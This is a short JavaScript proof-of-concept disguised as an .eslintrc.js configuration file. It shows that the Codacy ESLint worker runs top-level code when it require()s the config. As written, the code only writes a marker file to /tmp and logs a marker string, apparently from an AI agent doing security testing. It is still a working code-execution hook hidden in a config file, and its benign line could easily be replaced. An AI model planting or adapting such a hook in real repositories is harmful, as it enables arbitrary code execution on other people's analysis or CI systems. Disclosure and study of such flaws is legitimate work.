// PoC payload — benign marker only. RCE via codacy-eslint loading the repo's .eslintrc.js via require().
// ESLint loads .eslintrc.js by require()-ing it; top-level code runs during config load inside the Codacy worker.
// No node_modules, no parser, no plugin needed.
const fs = require("fs");
try {
  fs.writeFileSync("/tmp/codacy-eslint-rce-confirmed.txt", "RCE confirmed via .eslintrc.js load. cwd=" + __dirname + "
");
  console.log("CODEX-RCE-MARKER-ESLINT " + __dirname + " /tmp/codacy-eslint-rce-confirmed.txt");
} catch (e) { console.log("CODEX-RCE-MARKER-ESLINT-ERR " + e.message); }
module.exports = { root: true, rules: {} };
